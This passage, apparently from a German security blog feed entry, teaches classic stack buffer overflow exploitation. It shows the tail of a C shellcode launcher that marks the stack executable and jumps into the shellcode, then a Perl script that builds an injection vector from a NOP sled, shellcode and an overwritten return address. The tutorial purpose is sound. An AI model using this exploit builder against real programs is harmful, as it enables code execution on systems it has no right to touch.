class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"%s"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">argc </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strcmp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"-l"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"%d\n"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">argc </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strcmp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"-x"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/* allow to execute code on the stack */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">mprotect</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token number" style="color:#36acaa">0x08046000</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8192</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> PROT_READ </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> PROT_WRITE </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> PROT_EXEC</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">code</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">code</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">fprintf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stderr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Usage: %s [-l|-x]\n"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h1><code>shellcode.pl</code></h1>
<p>Dieses Perl-Script ist ein Wrapper für das aus <code>shellcode.c</code> entstehende Programm, der den kompletten Injection Vector (IV) konstruiert. Der IV besteht aus folgenden Teilen:</p>
<ul>
<li>
<p>viele NOPs. Dieser Bereich wird zum NOP-Sliding genutzt, da wir uns hier nicht damit beschäftigen wollen, wie wir den Shellcode direkt bytegenau ansprechen können.</p>
</li>
<li>
<p>Shellcode</p>
</li>
<li>
<p>nochmal NOPs. Manchmal könnte es sinnvoll sein, den Shellcode etwas in den Bereich niedriger Adressen zu verschieben. Als Platzhalter bis zum Instruction Pointer dienen diese NOP-Befehle. EBP. Eine 4 Byte große Zahl, die die Basisadresse des nächsthöheren Stackframes ist. Da unser Shellcode einen neuen Stackframe anlegt, kann diese Zahl beliebig sein. EIP. Eine 4 Byte große Zahl, die die Adresse des ersten auszuführenden Befehls des IV ist. Den korrekten Wert dieser Adresse zu ermitteln bedeutet, sich einige Zeit mit einem Debugger zu beschäftigen. Ich möchte hier ebenfalls auf die Lektüre der sehr ausführlichen Texte des Phrack-Magazins verweisen. Das Script bekommt als Parameter die Länge des zu überschreibenden Puffers und die Anzahl der nach dem Shellcode einzufügenden NOPs übergeben. Wie man diese Zahlen ermittelt, wird an dieser Stelle ebenfalls nicht besprochen.</p>
<p>Die Gesamtgröße des auf <code>stdout</code> ausgegebenen IV ist 8 Byte größer als die angegebene Pufferlänge (für EBP und EIP).</p>
<div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/usr/bin/perl -w</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use strict;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (2 != scalar @ARGV) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> die "./shellcode.pl  \n";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $buffer_length = $ARGV[0];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $nop_length2 = $ARGV[1];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">binmode STDOUT;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chomp (my $shellcode_length = \`./shellcode -l\`);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $shellcode = \`./shellcode\`;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $nop_length1 = $buffer_length - $shellcode_length;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $eip_recurrence=1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print STDERR "shellcode length: $shellcode_length bytes\n";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print STDERR "buffer length:    $buffer_length bytes\n";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print STDERR "nop sliding 1:    $nop_length1 bytes\n";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print STDERR "nop sliding 2:    $nop_length2 bytes\n";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $eip = chr(0x20) . chr(0x75) . chr(0x04) . chr(0x08);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $ebp = $eip;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $nop_slide1 = (chr(0x90)x$nop_length1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $nop_slide2 = (chr(0x90)x$nop_length2);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $iv = $nop_slide1 . $shellcode . $nop_slide2 . $ebp . ($eip x $eip_recurrence);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print STDOUT $iv;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
</ul>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
</feed>